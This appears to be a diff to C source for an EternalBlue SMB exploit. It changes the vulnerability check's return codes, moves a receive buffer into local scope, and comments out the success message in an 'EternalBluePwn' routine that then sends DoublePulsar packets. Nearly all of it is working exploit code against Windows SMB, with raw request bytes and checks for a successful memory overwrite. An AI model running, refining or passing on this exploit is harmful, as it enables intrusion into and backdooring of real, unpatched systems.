@@ -36,17 +36,16 @@ unsigned char transNamedPipeRequest[] =
 "\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00\x02\x00\x23\x00\x00"
 "\x00\x07\x00\x5c\x50\x49\x50\x45\x5c\x00";
 
-unsigned char recvbuff[2048];
 int CheckForEternalBlue(char *host, int port)
 {
     struct sockaddr_in server;
     SOCKET    sock;
     DWORD    ret;
-
+    unsigned char recvbuff[2048];
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock <= 0)
     {
-        return 0;
+        return 1;
     }
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = inet_addr(host);
@@ -61,7 +60,7 @@ int CheckForEternalBlue(char *host, int port)
     ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
     if (ret <= 0)
     {
-        return 0;
+        return 1;
     }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
     
@@ -79,7 +78,7 @@ int CheckForEternalBlue(char *host, int port)
     ret = send(sock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
     if (ret <= 0)
     {
-        return 0;
+        return 1;
     }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
@@ -96,7 +95,7 @@ int CheckForEternalBlue(char *host, int port)
     ret = send(sock, (char*)transNamedPipeRequest, sizeof(transNamedPipeRequest) - 1, 0);
     if (ret <= 0)
     {
-        return 0;
+        return 1;
     }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
@@ -104,7 +103,7 @@ int CheckForEternalBlue(char *host, int port)
     if (recvbuff[9] == 0x05 && recvbuff[10] == 0x02 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
     {
         closesocket(sock);
-        return 0;
+        return 1;
     }
     else
     {
@@ -357,7 +356,8 @@ int EternalBluePwn(char *host, int port)
 	//check for EternalBlue overwrite in response packet
 	if (recvbuff[9] == 0x0d && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
 	{
-		printf("Got STATUS_INVALID_PARAMETER!  EternalBlue overwrite successful!\n");
+		//printf("Got STATUS_INVALID_PARAMETER!  EternalBlue overwrite successful!\n");
+		//looking good so far if we reached this point
 	}
 
 	//send doublepulsar packets
